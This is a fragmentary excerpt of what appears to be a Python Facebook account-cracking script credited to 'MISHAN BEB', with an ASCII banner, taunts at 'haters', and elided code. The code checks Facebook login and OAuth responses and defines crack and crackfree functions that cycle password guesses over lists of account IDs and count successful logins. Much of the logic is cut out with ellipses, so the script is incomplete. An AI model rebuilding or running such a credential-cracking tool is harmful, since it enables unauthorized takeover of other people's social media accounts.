...
╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
➤➤⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃MISHAN BEB⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤➤
\033[1;32m➤==========MISHAN BEB===========➤
【✪】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
➤➤⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃MISHAN BEB⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤➤
[+] CREATED BY   : MISHAN-BEB⁃⁃⁃⁃➤
[+]  FB NAME     :   MISHAN BEB⁃⁃⁃⁃➤
[+] ON GITHUB    : MISHAN_DONA⁃⁃⁃⁃➤
[+] USE CLONE    : WIFI USE⁃⁃⁃⁃➤
[+] MAKE BY      :  MISHAN BEB⁃⁃⁃➤
[+] TOOL STATUS  :  FREE⁃⁃⁃⁃➤
[+] TOOL VERSION :  0.0.5
...
➤➤⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃ MISHAN BEB ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤➤
•────TH'W MISHAN×BEB────•
[FOR MY] IF YOU HATE ME... ITS MEANS         
[HATERS] I AM GOING BETTER THEN YOU MY KID
--------------------------------------------------
				...
				if 'How do you want to log into Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Success!' in str(response6):
							...
							animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN DONE RUN HANA');exit()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[MISHAN BEB]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
...
def crackfree(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[ZO RO]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
